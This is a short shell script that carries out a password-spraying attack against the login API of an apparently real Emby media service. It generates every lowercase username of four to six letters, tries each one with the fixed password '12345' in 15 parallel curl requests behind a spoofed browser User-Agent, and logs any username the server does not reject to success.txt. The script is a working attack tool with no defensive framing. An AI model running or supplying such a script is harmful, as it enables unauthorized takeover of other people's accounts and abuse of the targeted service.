#!/bin/sh

URL="https://emby.yun/api/embyUser/login"
PASS="12345"
THREAD=15

gen() {
  for c1 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
    for c2 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
      for c3 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
        for c4 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
          echo "$c1$c2$c3$c4"
          for c5 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
            echo "$c1$c2$c3$c4$c5"
            for c6 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
              echo "$c1$c2$c3$c4$c5$c6"
            done
          done
        done
      done
    done
  done
}

gen | xargs -P $THREAD -n 1 sh -c '
user="$1"
echo "--- 尝试: $user"

res=$(curl -s --max-time 10 -X POST "'"$URL"'" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
  -H "Content-Type: application/json" \
  -d "{\"userName\":\"$user\",\"password\":\"'$PASS'\"}")

echo "响应: $res"

if [ -n "$res" ] && \
   ! echo "$res" | grep -q "用户不存在" && \
   ! echo "$res" | grep -q "密码错误"; then
  echo ""
  echo "=========================================="
  echo "✅ 成功！账号：$user  密码：'$PASS'"
  echo "响应：$res"
  echo "=========================================="
  echo "$user:'$PASS'" >> success.txt
  exit 0
fi
' _
